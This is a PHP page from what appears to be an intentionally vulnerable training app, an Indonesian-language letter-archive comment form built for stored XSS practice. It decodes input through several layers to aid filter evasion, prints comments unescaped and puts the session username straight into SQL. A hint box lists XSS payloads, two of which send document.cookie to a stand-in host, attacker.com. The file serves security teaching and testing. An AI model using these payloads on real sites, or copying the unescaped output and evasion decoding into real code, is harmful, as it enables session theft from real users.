<?php
require_once 'config.php';

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'] ?? '';
    $username = $_SESSION['username'];
    
    // EVASION SUPPORT: Multi-level URL decoding
    $decoded_comment = $comment;
    for ($i = 0; $i < 5; $i++) {
        $prev = $decoded_comment;
        $decoded_comment = urldecode($decoded_comment);
        if ($prev === $decoded_comment) break;
    }
    
    // EVASION SUPPORT: HTML entity decoding
    $decoded_comment = html_entity_decode($decoded_comment, ENT_QUOTES | ENT_HTML5);
    
    // EVASION SUPPORT: Unicode escapes
    $decoded_comment = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function($m) {
        return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UTF-16BE');
    }, $decoded_comment);
    
    // VULNERABLE: Stored XSS
    // User input is stored directly in database without sanitization
    // When displayed, it's not escaped either
    $query = "INSERT INTO comments (username, email, content, created_at) VALUES ('" . $username . "', 'user@dvwa.local', '" . addslashes($decoded_comment) . "', NOW())";
    
    if ($mysqli->query($query)) {
        $message = "Komentar berhasil diposting!";
    } else {
        $message = "Kesalahan saat memposting komentar: " . $mysqli->error;
    }
}

// Check if there's a reset message from reset_db.php
if (isset($_SESSION['reset_message'])) {
    $message = $_SESSION['reset_message'];
    unset($_SESSION['reset_message']);
}

// Fetch all comments
$query = "SELECT username, content, created_at FROM comments ORDER BY created_at DESC LIMIT 20";
$result = $mysqli->query($query);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sistem Arsip Surat - Komentar Surat</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .back-link {
            background-color: #fff;
            color: #1e3c72;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
            padding: 10px 20px;
            border-radius: 6px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(255,255,255,0.2);
        }
        .back-link:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(255,255,255,0.3);
        }
        h1 {
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        .info-box {
            background-color: #fff;
            padding: 20px 25px;
            border-radius: 10px;
            margin-bottom: 25px;
            border-left: 5px solid #2a5298;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            color: #333;
        }
        .info-box h2 {
            color: #1e3c72;
            margin-top: 0;
        }
        .info-box p {
            color: #666;
            margin-bottom: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #1e3c72;
        }
        textarea {
            width: 100%;
            padding: 12px;
            box-sizing: border-box;
            background-color: #fff;
            color: #333;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            min-height: 80px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            transition: all 0.3s ease;
        }
        textarea:focus {
            outline: none;
            border-color: #2a5298;
            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
        }
        button {
            padding: 12px 24px;
            background: linear-gradient(135deg, #2a5298 0%, #1e3c72 100%);
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 3px 10px rgba(42, 82, 152, 0.3);
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(42, 82, 152, 0.4);
        }
        .message {
            background-color: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            border: 1px solid #c3e6cb;
        }
        .comments {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
        }
        .comments h3 {
            color: #1e3c72;
            margin-top: 0;
        }
        .comment {
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 10px;
            border-left: 4px solid #2a5298;
        }
        .comment-meta {
            color: #6c757d;
            font-size: 12px;
            margin-bottom: 10px;
        }
        .comment-author {
            font-weight: bold;
            color: #1e3c72;
        }
        .comment-content {
            color: #333;
            word-wrap: break-word;
        }
        .hint {
            background-color: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 13px;
            border: 1px solid #c3e6cb;
        }
        .hint code {
            background-color: #fff;
            padding: 2px 6px;
            border-radius: 3px;
            color: #d63384;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="dashboard_id.php" class="back-link">← Kembali ke Dasbor</a>
        <h1>Komentar Surat</h1>
        <div class="info-box">
            <h2>Tambah Komentar Surat</h2>
            <p>Tambahkan komentar pada surat masuk/keluar. Komentar akan tampil ke semua user. Fitur ini rentan terhadap Stored XSS.</p>
        </div>
        <form method="POST" action="reset_db.php" style="margin-bottom: 20px;">
            <input type="hidden" name="page" value="xss_stored_id.php">
            <button type="submit" name="reset_db" style="background-color: #ff6600; padding: 8px 15px; font-size: 14px;">🔄 Reset Komentar</button>
        </form>
        <form method="POST">
            <div class="form-group">
                <label for="comment">Komentar Surat</label>
                <textarea id="comment" name="comment" required></textarea>
            </div>
            <button type="submit">Posting Komentar</button>
        </form>
        <div class="hint">
            <strong>Petunjuk Eksploitasi:</strong><br>
            • Coba: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Skrip akan dieksekusi untuk setiap user yang melihat komentar<br>
            • Coba: <code>&lt;img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)"&gt;</code> - Curi cookie user<br>
            • Coba: <code>&lt;svg onload="document.location='https://attacker.com/?cookie='+document.cookie"&gt;</code> - Redirect dengan pencurian data
        </div>
        
        <?php if ($message): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        
        <div class="comments">
            <h3>Daftar Komentar (<?php echo $result->num_rows; ?>)</h3>
            <?php if ($result->num_rows > 0): ?>
                <?php while ($row = $result->fetch_assoc()): ?>
                    <div class="comment">
                        <div class="comment-meta">
                            <span class="comment-author"><?php echo htmlspecialchars($row['username']); ?></span>
                            - <?php echo htmlspecialchars($row['created_at']); ?>
                        </div>
                        <div class="comment-content">
                            <?php echo $row['content']; ?>
                        </div>
                    </div>
                <?php endwhile; ?>
            <?php else: ?>
                <p style="color: #aaa;">Belum ada komentar. Jadilah yang pertama posting!</p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
